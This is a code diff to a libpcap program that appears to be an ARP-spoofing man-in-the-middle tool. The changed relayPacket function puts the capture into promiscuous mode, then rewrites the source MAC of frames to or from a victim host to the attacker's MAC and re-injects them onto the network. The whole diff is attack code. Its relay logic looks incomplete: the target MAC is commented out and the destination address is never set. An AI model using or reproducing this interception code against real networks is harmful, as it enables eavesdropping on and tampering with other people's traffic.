@@ -53,10 +53,10 @@ void *relayPacket(void *args) {
     char *dev = relay_packet_args->dev;
     Mac *attacker_mac = relay_packet_args->attacker_mac;
     Mac *sender_mac = relay_packet_args->sender_mac;
-    Ip *target_ip = relay_packet_args->target_ip;
+    // Mac *target_mac = relay_packet_args->target_mac;
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return NULL;
@@ -73,9 +73,14 @@ void *relayPacket(void *args) {
         }
 
         EthHdr* eth = (EthHdr*)packet;
-        printf("eth->dmac_ : %s\n", eth->dmac_.operator std::string().c_str());
-        printf("eth->smac_ : %s\n", eth->smac_.operator std::string().c_str());
-        printf("eth->type_ : %d\n", eth->type_);
+        if (eth->smac_ == *sender_mac || eth->dmac_ == *sender_mac) {
+            eth->smac_ = *attacker_mac;
+            int res = pcap_sendpacket(handle, packet, header->caplen);
+            if (res != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                return NULL;
+            }
+        }
     }
 
     pcap_close(handle);
